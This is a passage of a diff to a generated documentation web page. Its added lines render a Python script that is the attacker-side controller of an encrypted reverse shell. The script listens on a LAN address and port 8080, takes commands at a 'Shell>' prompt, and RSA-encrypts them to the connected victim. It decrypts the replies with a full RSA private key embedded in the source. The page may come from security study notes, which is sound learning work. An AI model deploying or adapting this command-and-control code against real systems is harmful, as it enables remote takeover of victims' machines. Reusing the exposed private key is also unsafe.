+<span class="normal"><a href="#__codelineno-4-66"> 66</a></span>
+<span class="normal"><a href="#__codelineno-4-67"> 67</a></span>
+<span class="normal"><a href="#__codelineno-4-68"> 68</a></span>
+<span class="normal"><a href="#__codelineno-4-69"> 69</a></span>
+<span class="normal"><a href="#__codelineno-4-70"> 70</a></span>
+<span class="normal"><a href="#__codelineno-4-71"> 71</a></span>
+<span class="normal"><a href="#__codelineno-4-72"> 72</a></span>
+<span class="normal"><a href="#__codelineno-4-73"> 73</a></span>
+<span class="normal"><a href="#__codelineno-4-74"> 74</a></span>
+<span class="normal"><a href="#__codelineno-4-75"> 75</a></span>
+<span class="normal"><a href="#__codelineno-4-76"> 76</a></span>
+<span class="normal"><a href="#__codelineno-4-77"> 77</a></span>
+<span class="normal"><a href="#__codelineno-4-78"> 78</a></span>
+<span class="normal"><a href="#__codelineno-4-79"> 79</a></span>
+<span class="normal"><a href="#__codelineno-4-80"> 80</a></span>
+<span class="normal"><a href="#__codelineno-4-81"> 81</a></span>
+<span class="normal"><a href="#__codelineno-4-82"> 82</a></span>
+<span class="normal"><a href="#__codelineno-4-83"> 83</a></span>
+<span class="normal"><a href="#__codelineno-4-84"> 84</a></span>
+<span class="normal"><a href="#__codelineno-4-85"> 85</a></span>
+<span class="normal"><a href="#__codelineno-4-86"> 86</a></span>
+<span class="normal"><a href="#__codelineno-4-87"> 87</a></span>
+<span class="normal"><a href="#__codelineno-4-88"> 88</a></span>
+<span class="normal"><a href="#__codelineno-4-89"> 89</a></span>
+<span class="normal"><a href="#__codelineno-4-90"> 90</a></span>
+<span class="normal"><a href="#__codelineno-4-91"> 91</a></span>
+<span class="normal"><a href="#__codelineno-4-92"> 92</a></span>
+<span class="normal"><a href="#__codelineno-4-93"> 93</a></span>
+<span class="normal"><a href="#__codelineno-4-94"> 94</a></span>
+<span class="normal"><a href="#__codelineno-4-95"> 95</a></span>
+<span class="normal"><a href="#__codelineno-4-96"> 96</a></span>
+<span class="normal"><a href="#__codelineno-4-97"> 97</a></span>
+<span class="normal"><a href="#__codelineno-4-98"> 98</a></span>
+<span class="normal"><a href="#__codelineno-4-99"> 99</a></span>
+<span class="normal"><a href="#__codelineno-4-100">100</a></span>
+<span class="normal"><a href="#__codelineno-4-101">101</a></span>
+<span class="normal"><a href="#__codelineno-4-102">102</a></span>
+<span class="normal"><a href="#__codelineno-4-103">103</a></span>
+<span class="normal"><a href="#__codelineno-4-104">104</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="kn">import</span> <span class="nn">socket</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a><span class="kn">from</span> <span class="nn">Cryptodome.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a><span class="kn">from</span> <span class="nn">Cryptodome.Cipher</span> <span class="kn">import</span> <span class="n">PKCS1_OAEP</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4"></a>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5"></a><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">message</span><span class="p">):</span>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6"></a>    <span class="n">publickey</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;-----BEGIN PUBLIC KEY-----</span>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7"></a><span class="s1">MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAt9mjsBED9D/MYnU+W5+6</span>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8"></a><span class="s1">aP9SS1vgL9X6bThNkGKsZ5ZVfnoK4BxMBHI5Gi/YtoCJjyAGsWMpxy1fQ+F+ZWVA</span>
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9"></a><span class="s1">kwZDoQMWTrfZASHmQgB944PfGA7qfn15kDXmCyvzbitRyWvTs1LDDNF7Q/54Qj82</span>
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10"></a><span class="s1">h/85ibOPzQrpwQTjEAs8CJ14YWXAJnqOC6devaDYKdB7SSlueVtoQ8BxWc3hOJHJ</span>
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11"></a><span class="s1">pvgZQ/6NixnICLIrFN0YbKZo4A0D3yRJIdumZw8uqwEMeIt41ja6zOG3gKtsG8su</span>
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12"></a><span class="s1">BZ/MvqX0WgojWr6hNs1Q8h3LtiSsPiUP/bTWD9zos8Yr7RuEabesjHlY0qcNzZ/Y</span>
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13"></a><span class="s1">gKXdgxUkCikTjRon6Mvh7iWKAtEilQlDeBYMGUvFUQ5FMF5LZJ5Q/7+JXulv8Whq</span>
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14"></a><span class="s1">KTp4dGpB3kUWuN+ltxBr+IYPhpBfMcR97W+NuXDReUiIGFJpVI1m4AeCzz1BdAM7</span>
+</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15"></a><span class="s1">U928DcglK6IowMmN4McyKuv49YYPd7TNFjJWc7P6e19V3BsxA5jpCc6Dxp5AM6WC</span>
+</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16"></a><span class="s1">0FqgSSOGVCIkcHT5wLcALyaXOaO0vhMgWWO233Of33wh/7oHclsc5r44MHlZrNSe</span>
+</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17"></a><span class="s1">X2QIHCFU4Mwp1hutIuIKkn5dLt1qmt2CDUO/uxGbdTf667c9TLYcYWoi/eDBdrVx</span>
+</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18"></a><span class="s1">7CkYI7g81RdcB6jGgbr9W4kCAwEAAQ==</span>
+</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19"></a><span class="s1">-----END PUBLIC KEY-----&#39;&#39;&#39;</span>
+</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20"></a>    <span class="n">public_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="n">publickey</span><span class="p">)</span>
+</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21"></a>    <span class="n">encryptor</span> <span class="o">=</span> <span class="n">PKCS1_OAEP</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">public_key</span><span class="p">)</span>
+</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22"></a>    <span class="n">encryptedData</span> <span class="o">=</span> <span class="n">encryptor</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
+</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23"></a>    <span class="k">return</span> <span class="n">encryptedData</span>
+</span><span id="__span-4-24"><a id="__codelineno-4-24" name="__codelineno-4-24"></a>
+</span><span id="__span-4-25"><a id="__codelineno-4-25" name="__codelineno-4-25"></a><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">cipher</span><span class="p">):</span>
+</span><span id="__span-4-26"><a id="__codelineno-4-26" name="__codelineno-4-26"></a>    <span class="n">privatekey</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;-----BEGIN RSA PRIVATE KEY-----</span>
+</span><span id="__span-4-27"><a id="__codelineno-4-27" name="__codelineno-4-27"></a><span class="s1">MIIJKQIBAAKCAgEApceMHQ9c5Cdf+qgd4ASPM7WNbKavEwat78bMHQVK6cRNm2XS</span>
+</span><span id="__span-4-28"><a id="__codelineno-4-28" name="__codelineno-4-28"></a><span class="s1">WCLpTsYN2eUALV++dYi2Im0T92bqYojRm+p4vVKOvrdmcmfnITEw/++pbvGZYRf2</span>
+</span><span id="__span-4-29"><a id="__codelineno-4-29" name="__codelineno-4-29"></a><span class="s1">y0zsSJi1Mi+lfgQs56QXBMIU6IdeCL2C7cex9LNJ98ipGeN6nBiaExI9he3Pcivz</span>
+</span><span id="__span-4-30"><a id="__codelineno-4-30" name="__codelineno-4-30"></a><span class="s1">tD5vHowCwkbzAnpZgPamrN10/KukWKvJ3t05bc0MskjkhVaaN55eidzAXUmYmxyo</span>
+</span><span id="__span-4-31"><a id="__codelineno-4-31" name="__codelineno-4-31"></a><span class="s1">Leke1GssiU+TInZQXbSiUeeFsZpkMjYX4nCSxT/TuuFaDy6tfpfM+ePNEgeLjn7W</span>
+</span><span id="__span-4-32"><a id="__codelineno-4-32" name="__codelineno-4-32"></a><span class="s1">AJh2ApxaYhmqwbDTsXd0ldHc4iNeGmlaEGE9DgXPSp7ljV9SZ7eO9LZuiERz003N</span>
+</span><span id="__span-4-33"><a id="__codelineno-4-33" name="__codelineno-4-33"></a><span class="s1">rUqSKSHdYgEIH8wZrCiKSP471oNYn0ye+KdV/v25dqTXApO3QO/LZrJQ8twQyASR</span>
+</span><span id="__span-4-34"><a id="__codelineno-4-34" name="__codelineno-4-34"></a><span class="s1">1LB3tTVYGuNpRVLlNC4j4ivL22uDCbGOIBOaKDmu/QR5imLdjj3alVg69Ci3It3j</span>
+</span><span id="__span-4-35"><a id="__codelineno-4-35" name="__codelineno-4-35"></a><span class="s1">TlubtHDaXTVs+i1133fOKMnRPLmCHE1/6MMSi1BzDF46Q2XJwjgDnH5rk70n7sVq</span>
+</span><span id="__span-4-36"><a id="__codelineno-4-36" name="__codelineno-4-36"></a><span class="s1">uQtpHZkpQsuSSrjiL9Bi3jYghReVfFHC7aNFp42v7EMaLohpnFm6yKiEm5UacMs7</span>
+</span><span id="__span-4-37"><a id="__codelineno-4-37" name="__codelineno-4-37"></a><span class="s1">rLdnUQtAKo3r5UiNAegY6h/ZDncGhah1e5wFdBPIb9wJyTjPYTiTJ3rDQGECAwEA</span>
+</span><span id="__span-4-38"><a id="__codelineno-4-38" name="__codelineno-4-38"></a><span class="s1">AQKCAgAIWpZiboBBVQSepnMe80veELOIOpwO6uK/9vYZLkeYoRZCEu73FwdHu24+</span>
+</span><span id="__span-4-39"><a id="__codelineno-4-39" name="__codelineno-4-39"></a><span class="s1">QS5xmuYHmTSIZpO/f1WnUnqxjy63Z54e2TIV6Mt6Xja4ZvTUTONsQ59hnkY34E4d</span>
+</span><span id="__span-4-40"><a id="__codelineno-4-40" name="__codelineno-4-40"></a><span class="s1">Mc52m7JBmAC68ibIku23pgkff1Ul3hUHofp3fgGTNSAqftxPz+yItdNJjW3fDbIj</span>
+</span><span id="__span-4-41"><a id="__codelineno-4-41" name="__codelineno-4-41"></a><span class="s1">5RxgzxaMi6FZi61WADY/a6S4ENDQiikuIMM3PuZ1kAr2ioO9D7TbeCW3boxpqt7r</span>
+</span><span id="__span-4-42"><a id="__codelineno-4-42" name="__codelineno-4-42"></a><span class="s1">KnHhJjIljrExTGfty7hp2VT5ya9ztiQuwiVeJ32BqBehrguK8YtkSlrxW71yoztg</span>
+</span><span id="__span-4-43"><a id="__codelineno-4-43" name="__codelineno-4-43"></a><span class="s1">vydeLFF2m2zqEdG+KYcX8KAjvCqt4ctK2V49q1FplqBuSMODRbucy36FMfEFGRHK</span>
+</span><span id="__span-4-44"><a id="__codelineno-4-44" name="__codelineno-4-44"></a><span class="s1">Uc6qIWfQcZTuv1fJuq+8hYOYYcAEN/z6usF3KMTz1Qbk2qN01GAf8XcCjm3a56cc</span>
+</span><span id="__span-4-45"><a id="__codelineno-4-45" name="__codelineno-4-45"></a><span class="s1">nPWZp+1jYoPSvhU4XHiUb8iUqXGloX4NkkxmvFFtRtt/eE/ELypdLRpK8hkMACwI</span>
+</span><span id="__span-4-46"><a id="__codelineno-4-46" name="__codelineno-4-46"></a><span class="s1">tB4yoTZNm2wKAGC78IyLrgJDO/sBhA9uhWhoAVwX8Baou0HhYt2fvkl4rTR2e2rV</span>
+</span><span id="__span-4-47"><a id="__codelineno-4-47" name="__codelineno-4-47"></a><span class="s1">QTfwDTiOI5N/ETlFEVDLw2b9mBGtrvjnMVtSM/CztC+cswVu+rFGAYMemXjmBfUM</span>
+</span><span id="__span-4-48"><a id="__codelineno-4-48" name="__codelineno-4-48"></a><span class="s1">NHkeV2jRvafTvd7bz4Pm5CqOyi3LIxR0gb5YVIx/6bJ67W19+wKCAQEAtcyBmJO5</span>
+</span><span id="__span-4-49"><a id="__codelineno-4-49" name="__codelineno-4-49"></a><span class="s1">ToWebIU1afPOmkUTlfF8wPDLq3Ww8hn2KLD8AsiN7by3WJePMrnbKxMpBupFa/Rg</span>
+</span><span id="__span-4-50"><a id="__codelineno-4-50" name="__codelineno-4-50"></a><span class="s1">cRru84De31Y4vaxrxEh3ZiWwmn/sOXUFcDC4FtQGFN/4lNQ4wvb6UPRsYpgNuWWS</span>
+</span><span id="__span-4-51"><a id="__codelineno-4-51" name="__codelineno-4-51"></a><span class="s1">1Y8UhofeIWbo0fyP9nfB4juUYCGAngPN2gj6iogC33SVaBwqPKMQC4lFHjnfdDoZ</span>
+</span><span id="__span-4-52"><a id="__codelineno-4-52" name="__codelineno-4-52"></a><span class="s1">6G7NzSFpkslneOnLDrfZTqCiJa9Awjt6u/wpmeTdwnW9VC6abDNOeFzVP3+6/DOU</span>
+</span><span id="__span-4-53"><a id="__codelineno-4-53" name="__codelineno-4-53"></a><span class="s1">ExXdspWFVpI9QV/uYW6m0wFiC1KBGBAVmXYIZLVHBw0emgPbetlsCpFn7lAHSRlj</span>
+</span><span id="__span-4-54"><a id="__codelineno-4-54" name="__codelineno-4-54"></a><span class="s1">fwooOP6+YpsYzwKCAQEA6XE8ZXb+sgdvaLnBr8thAUgsHhSlZcMU+idmXPPTgu7/</span>
+</span><span id="__span-4-55"><a id="__codelineno-4-55" name="__codelineno-4-55"></a><span class="s1">foX6c7czIS73RrrCm9GCIQpv6k6BP/Exi9XMlEhmzQqcFFaKaPJMHRxMlHcgzJIL</span>
+</span><span id="__span-4-56"><a id="__codelineno-4-56" name="__codelineno-4-56"></a><span class="s1">AE/g5yKUJN0GAMROLv4FFT52pkdlm/HV0rQ+2FEUX/MYla5JggTrOHJoiWNNKUzQ</span>
+</span><span id="__span-4-57"><a id="__codelineno-4-57" name="__codelineno-4-57"></a><span class="s1">8uH2mQc+dEgzNvd+WhwNkJq5bRZqi2q+wvlj9NlucnEtD7Xcd9IoSNtHS0CfI83F</span>
+</span><span id="__span-4-58"><a id="__codelineno-4-58" name="__codelineno-4-58"></a><span class="s1">tWCIv5uQfK2cT1A2jcLlZtT7HHWKRpd7w6+jx5t4yhPVGhCb9UIe/nM2Ex2ZTbdE</span>
+</span><span id="__span-4-59"><a id="__codelineno-4-59" name="__codelineno-4-59"></a><span class="s1">qv7Bs2WF3lm5P/wvcrYbMcnVWo6Qrab0iRpthRz/zwKCAQEAl5IZuovvQ3hDzVaC</span>
+</span><span id="__span-4-60"><a id="__codelineno-4-60" name="__codelineno-4-60"></a><span class="s1">YgPTjOtqmOjtii84n4tQK4lZojNs6SUsr7lXY5V43mH2SMOAwTMxDgCBJ8u8zWf0</span>
+</span><span id="__span-4-61"><a id="__codelineno-4-61" name="__codelineno-4-61"></a><span class="s1">aWAJjpnif5OreI6T3zwoRv85uX/k+6NqLp1NM0h8yo//wt8GPm1ng9sbwNG52zAM</span>
+</span><span id="__span-4-62"><a id="__codelineno-4-62" name="__codelineno-4-62"></a><span class="s1">Eu0pz2ky3dqa23OxETTdduDVD6PMvxMG0ibxKgvRaxzIk9WuurSliNGoKBG5o/zn</span>
+</span><span id="__span-4-63"><a id="__codelineno-4-63" name="__codelineno-4-63"></a><span class="s1">eGpSyoyhr3O4ycVDawfihg3xFin2xUf7W9WuNDFmri9YjSFY6cgkrYCTRBZG8E2Z</span>
+</span><span id="__span-4-64"><a id="__codelineno-4-64" name="__codelineno-4-64"></a><span class="s1">DcR/LbI9nR4UGHhetfHjj5xZZcjy1oQM4+QcT2xH4PTFD0qLzDUM3fU87v4Y6uv4</span>
+</span><span id="__span-4-65"><a id="__codelineno-4-65" name="__codelineno-4-65"></a><span class="s1">711AIQKCAQEAjp9ILxWMdmhkgK88zpKLKaVWjuo+QvX1EwCPYar2RsCOCFcCtT/w</span>
+</span><span id="__span-4-66"><a id="__codelineno-4-66" name="__codelineno-4-66"></a><span class="s1">VQ3EtcnUrC5MOrONvLFJ9i79/lkZLF8vr4YT5bkZxxSBvCdWAj7mIxX28rHazlwp</span>
+</span><span id="__span-4-67"><a id="__codelineno-4-67" name="__codelineno-4-67"></a><span class="s1">9nuy9zT4L22y3U/UXbKxOZ1+7cSBwNeIgzaahph9AJrQuyPrCkVJFzp/TmUPrF7o</span>
+</span><span id="__span-4-68"><a id="__codelineno-4-68" name="__codelineno-4-68"></a><span class="s1">oVKbN7Ht2E/bWcWuFB/l6FfHRIfpseZFvFW5GigaEnqrchfGbwuELvPBHxdjdO0u</span>
+</span><span id="__span-4-69"><a id="__codelineno-4-69" name="__codelineno-4-69"></a><span class="s1">UX4gSbTQH7w7O6BT6wdE++wBCYV9oq4yFgQX5lzPbACBvyPUnckvqHOX2IDdByW3</span>
+</span><span id="__span-4-70"><a id="__codelineno-4-70" name="__codelineno-4-70"></a><span class="s1">rClVLOp+cq8f3kNZvoHrkqy2Ki2jS/hzsQKCAQB+A7OrM+7hns9bRKxm/SGChTx3</span>
+</span><span id="__span-4-71"><a id="__codelineno-4-71" name="__codelineno-4-71"></a><span class="s1">73c2IrGepgN/ra5eXNi/aywvpy+yOrorDcJ3gfTMg4yeVnqA/FcOMWQkpbHbtXAm</span>
+</span><span id="__span-4-72"><a id="__codelineno-4-72" name="__codelineno-4-72"></a><span class="s1">HDT/tc4t88SR2Z/gzt1ZAIT+dB2N5T0qV91ZTUm5XxIRfHiT/D3rokDzYbnQQKwl</span>
+</span><span id="__span-4-73"><a id="__codelineno-4-73" name="__codelineno-4-73"></a><span class="s1">yExyM9RINW9wIO19KNxDpS0TbcB0bkpYgn5f+bAvJ7Pe6Xof88DUrhoy3PnYHNYY</span>
+</span><span id="__span-4-74"><a id="__codelineno-4-74" name="__codelineno-4-74"></a><span class="s1">aH+BJDcZLlE/MpIXXgy+2afo7MkNBTS6jLPihnC447QhWZ2ufp2/dHnwy2XMJcsE</span>
+</span><span id="__span-4-75"><a id="__codelineno-4-75" name="__codelineno-4-75"></a><span class="s1">76tuOr1FELvtzE3z2BE9OvCJj4Mb3grRMD35Q1Aqd4TAgSF2Okl2EsmR/wf9</span>
+</span><span id="__span-4-76"><a id="__codelineno-4-76" name="__codelineno-4-76"></a><span class="s1">-----END RSA PRIVATE KEY-----&#39;&#39;&#39;</span>
+</span><span id="__span-4-77"><a id="__codelineno-4-77" name="__codelineno-4-77"></a>    <span class="n">private_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="n">privatekey</span><span class="p">)</span>
+</span><span id="__span-4-78"><a id="__codelineno-4-78" name="__codelineno-4-78"></a>    <span class="n">decryptor</span> <span class="o">=</span> <span class="n">PKCS1_OAEP</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">private_key</span><span class="p">)</span>
+</span><span id="__span-4-79"><a id="__codelineno-4-79" name="__codelineno-4-79"></a>    <span class="n">dec</span> <span class="o">=</span> <span class="n">decryptor</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">cipher</span><span class="p">)</span>
+</span><span id="__span-4-80"><a id="__codelineno-4-80" name="__codelineno-4-80"></a>    <span class="k">return</span> <span class="n">dec</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span><span id="__span-4-81"><a id="__codelineno-4-81" name="__codelineno-4-81"></a><span class="k">def</span> <span class="nf">connect</span><span class="p">():</span>
+</span><span id="__span-4-82"><a id="__codelineno-4-82" name="__codelineno-4-82"></a>    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
+</span><span id="__span-4-83"><a id="__codelineno-4-83" name="__codelineno-4-83"></a>    <span class="n">s</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s1">&#39;192.168.0.152&#39;</span><span class="p">,</span> <span class="mi">8080</span><span class="p">))</span>
+</span><span id="__span-4-84"><a id="__codelineno-4-84" name="__codelineno-4-84"></a>    <span class="n">s</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span><span id="__span-4-85"><a id="__codelineno-4-85" name="__codelineno-4-85"></a>    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[+] Listening for incoming TCP connection on port 8080&#39;</span><span class="p">)</span>
+</span><span id="__span-4-86"><a id="__codelineno-4-86" name="__codelineno-4-86"></a>    <span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
+</span><span id="__span-4-87"><a id="__codelineno-4-87" name="__codelineno-4-87"></a>
+</span><span id="__span-4-88"><a id="__codelineno-4-88" name="__codelineno-4-88"></a>    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span><span id="__span-4-89"><a id="__codelineno-4-89" name="__codelineno-4-89"></a>        <span class="n">store</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span><span id="__span-4-90"><a id="__codelineno-4-90" name="__codelineno-4-90"></a>        <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&quot;Shell&gt; &quot;</span><span class="p">)</span>
+</span><span id="__span-4-91"><a id="__codelineno-4-91" name="__codelineno-4-91"></a>        <span class="k">if</span> <span class="s1">&#39;terminate&#39;</span> <span class="ow">in</span> <span class="n">command</span><span class="p">:</span>
+</span><span id="__span-4-92"><a id="__codelineno-4-92" name="__codelineno-4-92"></a>            <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;terminate&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span><span id="__span-4-93"><a id="__codelineno-4-93" name="__codelineno-4-93"></a>            <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span id="__span-4-94"><a id="__codelineno-4-94" name="__codelineno-4-94"></a>            <span class="k">break</span>
+</span><span id="__span-4-95"><a id="__codelineno-4-95" name="__codelineno-4-95"></a>        <span class="k">else</span><span class="p">:</span>
+</span><span id="__span-4-96"><a id="__codelineno-4-96" name="__codelineno-4-96"></a>            <span class="n">command</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="n">command</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span><span id="__span-4-97"><a id="__codelineno-4-97" name="__codelineno-4-97"></a>            <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+</span><span id="__span-4-98"><a id="__codelineno-4-98" name="__codelineno-4-98"></a>            <span class="n">result</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+</span><span id="__span-4-99"><a id="__codelineno-4-99" name="__codelineno-4-99"></a>            <span class="k">try</span><span class="p">:</span>
+</span><span id="__span-4-100"><a id="__codelineno-4-100" name="__codelineno-4-100"></a>                <span class="nb">print</span><span class="p">(</span><span class="n">decrypt</span><span class="p">(</span><span class="n">result</span><span class="p">))</span>
+</span><span id="__span-4-101"><a id="__codelineno-4-101" name="__codelineno-4-101"></a>            <span class="k">except</span><span class="p">:</span>
+</span><span id="__span-4-102"><a id="__codelineno-4-102" name="__codelineno-4-102"></a>                <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[-] unable to decrypt/receive data!&quot;</span><span class="p">)</span>
+</span><span id="__span-4-103"><a id="__codelineno-4-103" name="__codelineno-4-103"></a>
+</span><span id="__span-4-104"><a id="__codelineno-4-104" name="__codelineno-4-104"></a><span class="n">connect</span><span class="p">()</span>
+</span></code></pre></div></td></tr></table></div>
 
 <!-- This section adds support for localized revision dates -->
 
@@ -17479,7 +17773,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../assets/javascripts/bundle.88dd0f4e.min.js"></script>
